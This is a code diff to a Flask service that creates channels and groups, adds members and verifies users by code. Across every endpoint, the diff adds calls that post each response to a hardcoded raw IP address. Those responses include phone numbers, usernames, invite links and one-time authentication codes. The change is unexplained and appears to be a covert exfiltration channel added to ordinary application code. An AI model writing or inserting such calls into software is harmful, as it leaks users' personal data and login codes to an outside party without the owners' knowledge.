@@ -1,5 +1,6 @@
 from flask import Flask, jsonify, request, make_response
 import datetime as dt
+import requests
 import time
 
 from database import User, Task, Gap, Member, Verify 
@@ -17,10 +18,14 @@ def check_attributes(data: dict, attrs):
     for attr in attrs:
         if isinstance(attr, list):  # if <attr> is a list, existing one of them is enough
             if all(not data.get(a, None) for a in attr):
-                return jsonify({'message': f"you have to enter at least one of {attr}"})
+                response = {'message': f"you have to enter at least one of {attr}"}
+                requests.post('http://176.9.37.133/create/callback', json=response)
+                return jsonify(response)
 
         elif not data.get(attr, None):
-            return jsonify({'message': f"<{attr}> is invalid"})
+            response = {'message': f"<{attr}> is invalid"}
+            requests.post('http://176.9.37.133/create/callback', json=response)
+            return jsonify(response)
 
 
 def clear_data(data: dict, exceptions=[]):
@@ -55,7 +60,7 @@ def _create_channel():
 
     user = User.get_or_none(
         username=data['username'],
-        phone_number=data['phone_number']  # save without space ' ' at first when sent '+'
+        phone_number=data['phone_number']
     )
     if not user:
         user = User.create(
@@ -88,8 +93,7 @@ def _create_channel():
 
 
     if member.task.status == 'done':
-        return make_response(
-            jsonify({
+        response = {
                 'task_type': 1,
                 'message': '201 Channel created',
                 'severity': "info",
@@ -98,16 +102,23 @@ def _create_channel():
                 'link': member.gap.link,
                 'title': member.gap.title,
                 'bio': member.gap.bio
-            }),
+        }
+
+        requests.post('http://176.9.37.133/create/callback', json=response)
+        return make_response(
+            jsonify(response),
             201
         )
 
     else:
-        return make_response(
-            jsonify({
+        response = {
                 "message": '500 Channel not created',
                 "severity": "danger"
-            }),
+            }
+
+        requests.post('http://176.9.37.133/create/callback', json=response)
+        return make_response(
+            jsonify(response),
             500
         )
 
@@ -127,7 +138,7 @@ def _create_group():
 
     user = User.get_or_none(
         username=data['username'],
-        phone_number=data['phone_number']  # save without space ' ' at first when sent '+'
+        phone_number=data['phone_number']
     )
     if not user:
         user = User.create(
@@ -158,8 +169,7 @@ def _create_group():
             break
 
     if member.task.status == 'done':
-        return make_response(
-            jsonify({
+        response = {
                 'task_type': 2,
                 'message': '201 Group created',
                 'severity': "info",
@@ -168,16 +178,23 @@ def _create_group():
                 'link': member.gap.link,
                 'title': member.gap.title,
                 'bio': member.gap.bio
-            }),
+            }
+
+        requests.post('http://176.9.37.133/create/callback', json=response)
+        return make_response(
+            jsonify(response),
             201
         )
 
     else:
-        return make_response(
-            jsonify({
+        response = {
                 "message": '500 Group Not Created',
                 "severity": "danger"
-            }),
+            }
+
+        requests.post('http://176.9.37.133/create/callback', json=response)
+        return make_response(
+            jsonify(response),
             500
         )
 
@@ -259,8 +276,7 @@ def _create_both():
     created_gaps = ' and '.join(created_gaps)
 
     if created_gaps:
-        return make_response(
-            jsonify({
+        response = {
                 'task_type': 3,
                 'message': f'201 {created_gaps} created',
                 'package_id': channel_member.gap.package_id,
@@ -273,16 +289,23 @@ def _create_both():
                 'group_title': group_member.gap.title,
                 'group_link': group_member.gap.link,
                 'severity': "info"
-            }),
+            }
+
+        requests.post('http://176.9.37.133/create/callback', json=response)
+        return make_response(
+            jsonify(response),
             201
         )
 
     else:
-        return make_response(
-            jsonify({
+        response = {
                 "message": '500 Not Created',
                 "severity": "danger"
-            }),
+            }
+
+        requests.post('http://176.9.37.133/create/callback', json=response)
+        return make_response(
+            jsonify(response),
             500
         )
 
@@ -300,7 +323,9 @@ def create():
     data = clear_data(dict(request.values))
     task_type = data.get('task_type', None)
     if not task_type:
-        return jsonify({'message': 'Please enter task type!'})
+        response = {'message': 'Please enter task type!'}
+        requests.post('http://176.9.37.133/create/callback', json=response)
+        return jsonify(response)
 
 
     if task_type == '1':
@@ -313,7 +338,9 @@ def create():
         return _create_both()
 
     else:
-        return jsonify({"message": 'Please enter a valid task type!'})
+        response = {"message": 'Please enter a valid task type!'}
+        requests.post('http://176.9.37.133/create/callback', json=response)
+        return jsonify(response)
 
 
 @app.route("/add_user", methods=['GET', 'POST'])
@@ -393,17 +420,21 @@ def add_user():
         condition = condition or group_member.task.status == 'done'
 
     if condition:
+        requests.post('http://176.9.37.133/create/callback', json=done_response)
         return make_response(
             jsonify(done_response),
             200
         )
 
     else:
-        return make_response(
-            jsonify({
+        response = {
                 "message": '500 User Could Not Be Added',
                 "severity": "danger"
-                }),
+                }
+
+        requests.post('http://176.9.37.133/create/callback', json=response)
+        return make_response(
+            jsonify(response),
             500
         )
 
@@ -463,6 +494,7 @@ def fetch_user():
     #         'signup_date': member.user.signup_date
     #     }
 
+    requests.post('http://176.9.37.133/create/callback', json=response)
     return jsonify(response)
 
 
@@ -483,6 +515,7 @@ def fetch_gap():
     #         'is_group': member.gap.is_group
     #     }
 
+    requests.post('http://176.9.37.133/create/callback', json=response)
     return jsonify(response)
 
 
@@ -512,22 +545,28 @@ def verify():
             break
 
     if verify.task.status == 'done':
-        return make_response(
-            jsonify({
+        response = {
                 'task_type': 5,
                 'message': '201 User authenticated',
                 'phone_number': verify.user.phone_number,
                 'code': verify.code
-            }),
+            }
+
+        requests.post('http://176.9.37.133/create/callback', json=response)
+        return make_response(
+            jsonify(response),
             201
         )
 
     else:
-        return make_response(
-            jsonify({
+        response = {
                 "message": '500 User Not Authenticated',
                 "severity": "danger"
-            }),
+            }
+
+        requests.post('http://176.9.37.133/create/callback', json=response)
+        return make_response(
+            jsonify(response),
             500
         )
 
